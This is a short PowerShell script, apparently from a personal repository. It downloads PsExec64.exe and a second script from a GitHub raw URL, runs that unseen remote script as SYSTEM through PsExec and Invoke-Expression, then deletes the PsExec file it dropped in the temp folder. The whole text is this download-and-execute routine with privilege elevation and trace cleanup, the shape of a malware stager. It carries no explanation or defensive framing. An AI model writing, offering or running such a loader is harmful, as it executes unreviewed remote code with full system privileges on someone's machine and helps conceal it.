$psexecUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/PsExec64.exe"
$scriptUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/script1.ps1"
# Download PsExec to memory
$psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content

# Download the PowerShell script to memory
$scriptContent = (Invoke-WebRequest -Uri $scriptUrl).Content

# Create a temporary file for PsExec
$tempPsExecPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "PsExec64.exe")
[System.IO.File]::WriteAllBytes($tempPsExecPath, $psexecBytes)

# Create a script block from the downloaded script content
$scriptBlock = [scriptblock]::Create($scriptContent)

# Execute PsExec to run the downloaded PowerShell script as SYSTEM
$psExecCommand = "& `"$tempPsExecPath`" -accepteula -s -i powershell.exe -Command $scriptBlock"
Invoke-Expression -Command $psExecCommand

# Clean up the temporary PsExec file
Remove-Item $tempPsExecPath